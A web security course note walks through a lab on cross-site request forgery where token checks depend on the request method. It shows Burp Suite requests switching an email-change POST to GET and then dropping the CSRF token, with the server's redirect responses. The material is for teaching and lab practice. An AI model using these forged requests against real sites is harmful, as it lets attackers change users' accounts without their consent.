---
course: Web Security
topic: Cross-Site Request Forgery (CSRF)
tags: [web-security]
---

## Understanding the Lab Scenario

In this lab, we are dealing with a web application that allows users to change their email address. The application uses a CSRF token to protect against CSRF attacks, but the protection is flawed. Specifically, the application only validates the CSRF token for POST requests and not for GET requests.

### Initial Setup

Let's start by logging into the web application and navigating to the page where we can change the email address. We will use the Burp Suite to intercept and modify the requests.

#### Step 1: Intercept the Initial Request

1. **Log In**: Log into the web application using your credentials.
2. **Navigate to Email Change Page**: Navigate to the page where you can change your email address.
3. **Intercept the Request**: Use Burp Suite to intercept the request sent to the server when you attempt to change your email.

The intercepted request might look like this:

```http
POST /change-email HTTP/1.1
Host: vulnerable-app.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123
Content-Length: 44

email=new.email@example.com&csrf_token=1234567890abcdef
```

### Analyzing the Request

Notice the presence of the `csrf_token` parameter in the POST request. This token is used to validate the request and prevent CSRF attacks. However, the application only validates this token for POST requests and not for GET requests.

#### Step 2: Change the Request Method

To exploit this vulnerability, we need to change the request method from POST to GET. This can be done by modifying the intercepted request in Burp Suite.

```http
GET /change-email?email=new.email@example.com&csrf_token=1234567890abcdef HTTP/1.1
Host: vulnerable-app.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Cookie: session=abc123
```

### Testing the Modified Request

Send the modified GET request to the server and observe the response. If the application is vulnerable, the request will succeed, and the email address will be changed.

#### Step 3: Verify the Vulnerability

To confirm the vulnerability, follow the redirection and check if the email address has been changed.

```http
HTTP/1.1 302 Found
Date: Tue, 14 Sep 2021 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: /profile
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

By following the redirection, you should see that the email address has been successfully changed.

### Exploiting the Vulnerability

Now that we have confirmed the vulnerability, let's exploit it by removing the `csrf_token` parameter altogether.

#### Step 4: Remove the CSRF Token

Modify the GET request to remove the `csrf_token` parameter:

```http
GET /change-email?email=test2@test.ca HTTP/1.1
Host: vulnerable-app.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Cookie: session=abc123
```

Send the modified request and observe the response. If the application is vulnerable, the request will succeed, and the email address will be changed.

#### Step 5: Verify the Exploit

Follow the redirection and check if the email address has been changed to `test2@test.ca`.

```http
HTTP/1.1 302 Found
Date: Tue, 14 Sep 2021 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: /profile
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

By following the redirection, you should see that the email address has been successfully changed to `test2@test.ca`.

### Conclusion

This lab demonstrates a critical flaw in the application's CSRF protection mechanism. By changing the request method from POST to GET and removing the `csrf_token` parameter, we were able to exploit the vulnerability and change the email address.

---
<!-- nav -->
[[10-Understanding Cross-Site Request Forgery (CSRF)|Understanding Cross-Site Request Forgery (CSRF)]] | [[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/03-Lab 2 CSRF where token validation depends on request method/00-Overview|Overview]] | [[12-Understanding the Lab Setup|Understanding the Lab Setup]]
